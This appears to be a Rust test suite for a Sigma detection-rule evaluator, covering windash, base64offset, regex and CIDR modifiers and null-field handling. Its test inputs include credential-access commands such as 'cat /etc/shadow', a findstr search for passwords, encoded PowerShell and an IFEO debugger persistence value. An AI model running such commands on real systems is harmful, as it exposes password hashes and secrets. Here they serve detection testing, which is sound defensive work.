        let by_modifier = verdict(
            "title: t\nid: m1\ndetection:\n    selection:\n        CommandLine|fieldref: 'ParentCommandLine'\n    condition: selection\n",
            "cat /etc/shadow",
        );
        assert_eq!(by_modifier.outcome, Outcome::Indeterminate);
        assert_eq!(by_modifier.blocking_modifiers, vec!["fieldref".to_string()]);
        // CommandLine *is* synthesizable, so nothing is missing — only the
        // modifier is in the way.
        assert!(by_modifier.missing_fields.is_empty());

        // The mirror case: a field a command line cannot supply, no exotic
        // modifier anywhere.
        let by_field = verdict(PARENT, "whoami");
        assert_eq!(by_field.outcome, Outcome::Indeterminate);
        assert!(by_field.blocking_modifiers.is_empty());
        assert_eq!(by_field.missing_fields, vec!["ParentImage".to_string()]);
    }

    #[test]
    fn every_unsupported_modifier_in_a_rule_is_named() {
        // Chained modifiers: `utf16le` is unimplemented, `contains` is not. Only
        // the unimplemented one should be reported, and the chain must not hide
        // it behind the one we do support.
        //
        // `utf16le` and `fieldref` stand in for "any modifier we do not
        // implement". If either one ever lands, re-point this test at another
        // unimplemented token — the property it guards outlives the example.
        let v = verdict(
            "title: t\nid: m2\ndetection:\n    selection:\n        CommandLine|utf16le|contains: 'whoami'\n        Image|fieldref: 'ParentImage'\n    condition: selection\n",
            "cat /etc/shadow",
        );
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert_eq!(
            v.blocking_modifiers,
            vec!["fieldref".to_string(), "utf16le".to_string()],
            "sorted, deduplicated, and excluding the supported `contains`"
        );
    }

    // --- windash -----------------------------------------------------------

    const WINDASH: &str = r#"
title: Findstr subfolder search
id: w1
detection:
    selection:
        CommandLine|contains|windash: ' -s '
    condition: selection
"#;

    #[test]
    fn windash_matches_a_forward_slash_variant() {
        assert_eq!(
            verdict(WINDASH, "findstr /s /i password *.txt").outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn windash_matches_a_unicode_dash_variant() {
        // U+2013 EN DASH — what a copied-from-a-blog-post command line carries.
        let yaml = "title: t\nid: w2\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -enc '\n    condition: selection\n";
        assert_eq!(
            verdict(yaml, "powershell \u{2013}enc SQBFAFgA").outcome,
            Outcome::Fires
        );
        // U+2014 EM DASH is in the set too.
        assert_eq!(
            verdict(yaml, "powershell \u{2014}enc SQBFAFgA").outcome,
            Outcome::Fires
        );
        assert_eq!(
            verdict(yaml, "powershell \u{2022}enc SQBFAFgA").outcome,
            Outcome::NoFire,
            "a bullet is not a dash character"
        );
    }

    #[test]
    fn windash_does_not_match_an_unrelated_command() {
        // Expansion must not become so broad that it swallows everything.
        assert_eq!(verdict(WINDASH, "ls -la").outcome, Outcome::NoFire);
    }

    #[test]
    fn windash_only_rewrites_a_dash_at_a_word_boundary() {
        // pySigma's `\B[-/]`: the dash in `a-b` is preceded by a word
        // character, so `a/b` is *not* one of its variants. An implementation
        // that rewrites every dash passes every other windash test but fails
        // this one.
        let yaml = "title: t\nid: w3\ndetection:\n    selection:\n        CommandLine|contains|windash: 'a-b'\n    condition: selection\n";
        assert_eq!(verdict(yaml, "echo a/b").outcome, Outcome::NoFire);
        assert_eq!(verdict(yaml, "echo a-b").outcome, Outcome::Fires);
    }

    #[test]
    fn windash_with_all_requires_every_authored_value() {
        // `all` ANDs across the values as authored; each value is satisfied by
        // any of *its own* dash variants. Flattening the expansion into one
        // list makes the first case pass, which is the bug this guards.
        let yaml = "title: t\nid: w4\ndetection:\n    selection:\n        CommandLine|contains|all|windash:\n            - ' -s '\n            - ' -i '\n    condition: selection\n";
        assert_eq!(
            verdict(yaml, "findstr /s /q password").outcome,
            Outcome::NoFire
        );
        assert_eq!(
            verdict(yaml, "findstr /s /i password").outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn windash_expansion_is_five_variants_deduplicated() {
        assert_eq!(windash_variants(" -s ").len(), 5);
        assert!(windash_variants(" -s ").contains(&" /s ".to_string()));
        assert!(windash_variants(" /s ").contains(&" -s ".to_string()));
        // No eligible position collapses back to the value itself.
        assert_eq!(windash_variants("plain"), vec!["plain".to_string()]);
        // Both dashes move together, so this is 5 variants and not 25.
        let two = windash_variants(" -a -b");
        assert_eq!(two.len(), 5);
        assert!(two.contains(&" /a /b".to_string()));
        assert!(!two.contains(&" /a -b".to_string()));
    }

    // --- base64offset ------------------------------------------------------

    const B64OFF: &str = r#"
title: Encoded whoami
id: b1
detection:
    selection:
        CommandLine|base64offset|contains: 'whoami'
    condition: selection
"#;

    #[test]
    fn base64offset_matches_each_of_the_three_offsets() {
        // One command per byte alignment. An implementation with a wrong
        // trailing-trim table passes at most one of these.
        for encoded in ["d2hvYW1p", "dob2Fta", "3aG9hbW"] {
            assert_eq!(
                verdict(B64OFF, &format!("powershell -enc {encoded}")).outcome,
                Outcome::Fires,
                "offset encoding {encoded} should match"
            );
        }
    }

    #[test]
    fn base64offset_does_not_match_an_unrelated_payload() {
        assert_eq!(
            verdict(B64OFF, "powershell -enc bm90aGluZw==").outcome,
            Outcome::NoFire
        );
    }

    #[test]
    fn base64offset_needles_are_case_sensitive() {
        // Base64 is case-significant. Folding case here would match a blob
        // that decodes to something else entirely and claim the rule fires.
        assert_eq!(
            verdict(B64OFF, "powershell -enc d2hvyw1p").outcome,
            Outcome::NoFire
        );
    }

    #[test]
    fn base64offset_expansion_matches_pysigma() {
        assert_eq!(
            base64offset_variants("whoami").expect("long enough"),
            vec![
                "d2hvYW1p".to_string(),
                "dob2Fta".to_string(),
                "3aG9hbW".to_string(),
            ]
        );
        // The three residues of (len + offset) % 3, so the trailing-trim table
        // is exercised in every column.
        for v in ["abc", "abcd", "abcde"] {
            let got = base64offset_variants(v).expect("long enough");
            assert_eq!(got.len(), 3);
            assert!(
                got.iter().all(|s| !s.is_empty() && !s.contains('=')),
                "{v} produced a padded or empty needle: {got:?}"
            );
        }
        // Ground truth: the literals SigmaHQ itself publishes for the UTF-16LE
        // form of '::FromBase64String'.
        let utf16: String = "::FromBase64String"
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .map(|b| b as char)
            .collect();
        assert_eq!(
            base64offset_variants(&utf16).expect("long enough"),
            vec![
                "OgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA".to_string(),
                "oAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnA".to_string(),
                "6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw".to_string(),
            ]
        );
    }

    #[test]
    fn a_short_base64offset_value_stays_indeterminate() {
        // At one byte the middle alignment slices to an empty needle, and
        // `contains("")` is true of every command line. Abstaining is the only
        // honest answer; firing on everything is the bug this guards.
        let yaml = "title: t\nid: b2\ndetection:\n    selection:\n        CommandLine|base64offset|contains: 'a'\n    condition: selection\n";
        let v = verdict(yaml, "echo hello");
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert_eq!(v.blocking_modifiers, vec!["base64offset".to_string()]);
    }

    #[test]
    fn an_unsupported_token_in_a_chain_suppresses_the_supported_ones() {
        // `wide` means the value is UTF-16 before encoding. We do not implement
        // it, so emitting ASCII needles would answer a different question than
        // the rule asked.
        let yaml = "title: t\nid: b3\ndetection:\n    selection:\n        CommandLine|wide|base64offset|contains: 'whoami'\n    condition: selection\n";
        let v = verdict(yaml, "powershell -enc d2hvYW1p");
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert_eq!(v.blocking_modifiers, vec!["wide".to_string()]);
    }

    // --- re ----------------------------------------------------------------

    #[test]
    fn re_matches_and_is_case_insensitive() {
        let yaml = "title: t\nid: e1\ndetection:\n    selection:\n        CommandLine|re: 'shadow'\n    condition: selection\n";
        assert_eq!(verdict(yaml, "cat /etc/SHADOW").outcome, Outcome::Fires);
    }

    #[test]
    fn re_is_unanchored() {
        // SigmaHQ writes patterns expecting a search, not a full match. An
        // anchored implementation returns NoFire here — a false negative.
        let yaml = "title: t\nid: e2\ndetection:\n    selection:\n        CommandLine|re: '/etc/shadow'\n    condition: selection\n";
        assert_eq!(verdict(yaml, "cat /etc/shadow").outcome, Outcome::Fires);
    }

    #[test]
    fn re_no_fire_on_a_non_match() {
        let yaml = "title: t\nid: e3\ndetection:\n    selection:\n        CommandLine|re: '\\bpasswd\\b'\n    condition: selection\n";
        let v = verdict(yaml, "cat /etc/shadow");
        assert_eq!(v.outcome, Outcome::NoFire);
        assert!(v.blocking_modifiers.is_empty());
    }

    #[test]
    fn re_matches_the_raw_value_not_a_lowercased_one() {
        // An inline `(?-i)` has to survive, which it cannot if the haystack was
        // folded before the pattern ever saw it.
        let yaml = "title: t\nid: e4\ndetection:\n    selection:\n        CommandLine|re: '(?-i)SHADOW'\n    condition: selection\n";
        assert_eq!(verdict(yaml, "cat /etc/SHADOW").outcome, Outcome::Fires);
        assert_eq!(verdict(yaml, "cat /etc/shadow").outcome, Outcome::NoFire);
    }

    #[test]
    fn re_i_sub_modifier_is_accepted() {
        let yaml = "title: t\nid: e5\ndetection:\n    selection:\n        CommandLine|re|i: 'SHADOW'\n    condition: selection\n";
        let v = verdict(yaml, "cat /etc/shadow");
        assert_eq!(v.outcome, Outcome::Fires);
        assert!(
            v.blocking_modifiers.is_empty(),
            "the `i` sub-modifier must be consumed by `re`, not reported unknown"
        );
    }

    #[test]
    fn an_uncompilable_regex_stays_indeterminate() {
        // Both patterns would match under a PCRE engine. Answering NO-FIRE here
        // would convert "this evaluator cannot read the pattern" into "the rule
        // would not fire" — the one failure this evaluator exists to prevent.
        for pattern in ["(?<=sudo )su", "(a)\\1"] {
            let yaml = format!(
                "title: t\nid: e6\ndetection:\n    selection:\n        CommandLine|re: '{pattern}'\n    condition: selection\n"
            );
            let v = verdict(&yaml, "sudo su");
            assert_eq!(
                v.outcome,
                Outcome::Indeterminate,
                "pattern {pattern} must abstain"
            );
            assert_eq!(v.blocking_modifiers, vec!["re".to_string()]);
        }
    }

    #[test]
    fn an_oversized_regex_stays_indeterminate() {
        let yaml = "title: t\nid: e7\ndetection:\n    selection:\n        CommandLine|re: '(?:a{1000}){1000}'\n    condition: selection\n";
        let v = verdict(yaml, "aaaa");
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert_eq!(v.blocking_modifiers, vec!["re".to_string()]);
    }

    // --- cidr --------------------------------------------------------------

    /// A rule keyed on a network. Evaluated through `evaluate_observed`,
    /// because a command line alone never carries a destination address.
    fn cidr_rule(networks: &str) -> String {
        format!(
            "title: t\nid: c1\ndetection:\n    selection:\n        DestinationIp|cidr: {networks}\n    condition: selection\n"
        )
    }

    #[test]
    fn cidr_matches_an_address_inside_the_network() {
        let v = observed_verdict(
            &cidr_rule("'10.0.0.0/8'"),
            "curl http://internal",
            &[("DestinationIp", "10.1.2.3")],
        );
        assert_eq!(v.outcome, Outcome::Fires);
    }

    #[test]
    fn cidr_no_fire_outside_the_network() {
        let v = observed_verdict(
            &cidr_rule("'10.0.0.0/8'"),
            "curl http://elsewhere",
            &[("DestinationIp", "192.168.1.1")],
        );
        assert_eq!(v.outcome, Outcome::NoFire);
    }

    #[test]
    fn cidr_v6_containment() {
        let rule = cidr_rule("'fe80::/10'");
        assert_eq!(
            observed_verdict(&rule, "curl http://x", &[("DestinationIp", "fe80::1")]).outcome,
            Outcome::Fires
        );
        assert_eq!(
            observed_verdict(&rule, "curl http://x", &[("DestinationIp", "2001:db8::1")]).outcome,
            Outcome::NoFire
        );
    }

    #[test]
    fn cidr_across_address_families_does_not_match() {
        // A definitive negative, not an abstention: a v6 address genuinely is
        // not inside a v4 network.
        let v = observed_verdict(
            &cidr_rule("'10.0.0.0/8'"),
            "curl http://x",
            &[("DestinationIp", "2001:db8::1")],
        );
        assert_eq!(v.outcome, Outcome::NoFire);
    }

    #[test]
    fn cidr_bare_address_is_a_host_route() {
        let rule = cidr_rule("'10.1.2.3'");
        assert_eq!(
            observed_verdict(&rule, "curl http://x", &[("DestinationIp", "10.1.2.3")]).outcome,
            Outcome::Fires
        );
        assert_eq!(
            observed_verdict(&rule, "curl http://x", &[("DestinationIp", "10.1.2.4")]).outcome,
            Outcome::NoFire
        );
    }

    #[test]
    fn cidr_prefix_zero_matches_everything() {
        // Also the regression guard for shifting a u128 by 128.
        let v = observed_verdict(
            &cidr_rule("'0.0.0.0/0'"),
            "curl http://x",
            &[("DestinationIp", "8.8.8.8")],
        );
        assert_eq!(v.outcome, Outcome::Fires);
    }

    #[test]
    fn cidr_ignores_a_port_suffix() {
        assert_eq!(
            observed_verdict(
                &cidr_rule("'10.0.0.0/8'"),
                "curl http://x",
                &[("DestinationIp", "10.1.2.3:443")]
            )
            .outcome,
            Outcome::Fires
        );
        assert_eq!(
            observed_verdict(
                &cidr_rule("'fe80::/10'"),
                "curl http://x",
                &[("DestinationIp", "[fe80::1]:443")]
            )
            .outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn a_malformed_cidr_stays_indeterminate() {
        for network in ["'10.0.0.0/99'", "'not-an-ip/8'"] {
            let v = observed_verdict(
                &cidr_rule(network),
                "curl http://x",
                &[("DestinationIp", "10.1.2.3")],
            );
            assert_eq!(
                v.outcome,
                Outcome::Indeterminate,
                "network {network} must abstain"
            );
            assert_eq!(v.blocking_modifiers, vec!["cidr".to_string()]);
        }
    }

    #[test]
    fn a_non_ip_field_value_stays_indeterminate() {
        // A hostname says nothing about whether the address was in the network.
        // NoFire here would be a claim we cannot support.
        let v = observed_verdict(
            &cidr_rule("'10.0.0.0/8'"),
            "curl http://x",
            &[("DestinationIp", "example.com")],
        );
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert_eq!(
            v.blocking_modifiers,
            vec!["cidr".to_string()],
            "an abstention must say what it is waiting on"
        );
    }

    #[test]
    fn field_absent_semantics_are_tracked_apart_from_modifiers() {
        // `field: null` asserts absence. Abstaining is defensible, so it must
        // not inflate the modifier bucket that drives implementation priority.
        let v = verdict(
            "title: t\nid: m3\ndetection:\n    selection:\n        ParentImage: null\n    condition: selection\n",
            "whoami",
        );
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert!(v.null_value_match);
        assert!(v.blocking_modifiers.is_empty());
    }

    #[test]
    fn a_null_filter_under_a_negation_abstains_however_complete_the_record() {
        // `field: null` is gated to Unknown before the record is consulted, so a
        // rule shaped `selection and not 1 of filter_*` — SigmaHQ's standard
        // autorun-key shape — can never resolve to a fire: `1 of filter_*` is
        // never definitely false, so its negation is never definitely true.
        // Supplying every field the rule names does not change that. This is why
        // `ifeo-debugger` withdrew its Sigma claim rather than being re-pointed
        // at *CurrentVersion NT Autorun Keys Modification*: that rule could not
        // have verified the claim on any record.
        let yaml = "title: t\nid: n1\ndetection:\n    selection:\n        TargetObject|contains: '\\Image File Execution Options'\n    filter_main_null:\n        Details: null\n    condition: selection and not 1 of filter_*\n";
        let rule = parse_rule(yaml).expect("rule parses");
        let record: HashMap<String, String> = [
            (
                "TargetObject",
                "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\\Debugger",
            ),
            ("Details", "C:\\windows\\system32\\cmd.exe"),
            ("Image", "C:\\Windows\\System32\\reg.exe"),
        ]
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();

        let v = evaluate_record(&rule, &record);
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert!(v.null_value_match, "the cause must name the null assertion");
        assert!(
            v.missing_fields.is_empty(),
            "the record supplies every field the rule names, so absence is not the cause"
        );
    }

    #[test]
    fn a_resolved_verdict_reports_no_causes() {
        let fires = verdict(SHADOW, "cat /etc/shadow");
        assert_eq!(fires.outcome, Outcome::Fires);
        assert!(fires.blocking_modifiers.is_empty());
        assert!(fires.missing_fields.is_empty());
        assert!(!fires.null_value_match);
    }

    #[test]
    fn wildcard_value_matches() {
        let yaml = "title: t\nid: r6\ndetection:\n    selection:\n        Image: '*/cat'\n    condition: selection\n";
        assert_eq!(verdict(yaml, "cat /etc/passwd").outcome, Outcome::Fires);
    }

    #[test]
    fn observed_parent_field_resolves_indeterminate_to_fires() {
        // PARENT keys on ParentImage, which a command line cannot supply, so
        // predictive evaluation is indeterminate…
        let rule = parse_rule(PARENT).unwrap();
        let c = cmd("whoami");
        let pred = evaluate(&rule, &c, Platform::LinuxAuditd);
        assert_eq!(pred.outcome, Outcome::Indeterminate);
        assert!(pred.missing_fields.iter().any(|f| f == "ParentImage"));

        // …but a recorded event carrying the real ParentImage fires the rule,
        // with nothing left missing.
        let mut observed = HashMap::new();
        observed.insert("ParentImage".to_string(), "/usr/sbin/sshd".to_string());
        let obs = evaluate_observed(&rule, &c, Platform::LinuxAuditd, &observed);
        assert_eq!(obs.outcome, Outcome::Fires);
        assert!(obs.missing_fields.is_empty());
    }

    #[test]
    fn observed_parent_field_can_also_exclude_a_fire() {
        // A recorded parent that does not match turns the same indeterminate
        // into a definite no-fire — the point of consulting the real event.
        let rule = parse_rule(PARENT).unwrap();
        let c = cmd("whoami");
        let mut observed = HashMap::new();
        observed.insert("ParentImage".to_string(), "/usr/bin/bash".to_string());
        assert_eq!(
            evaluate_observed(&rule, &c, Platform::LinuxAuditd, &observed).outcome,
            Outcome::NoFire
        );
    }

    #[test]
    fn empty_observed_value_does_not_mask_the_synthesized_base() {
        // A blank observed field is ignored, leaving the synthesized fallback —
        // a direct CommandLine match still fires.
        let rule = parse_rule(SHADOW).unwrap();
        let c = cmd("cat /etc/shadow");
        let mut observed = HashMap::new();
        observed.insert("CommandLine".to_string(), String::new());
        assert_eq!(
            evaluate_observed(&rule, &c, Platform::LinuxAuditd, &observed).outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn condition_parser_handles_parens_and_not() {
        let rule = parse_rule(FILTER).unwrap();
        // `selection and not filter` parsed into And(Id, Not(Id))
        assert!(matches!(rule.condition, Cond::And(_, _)));
    }
}
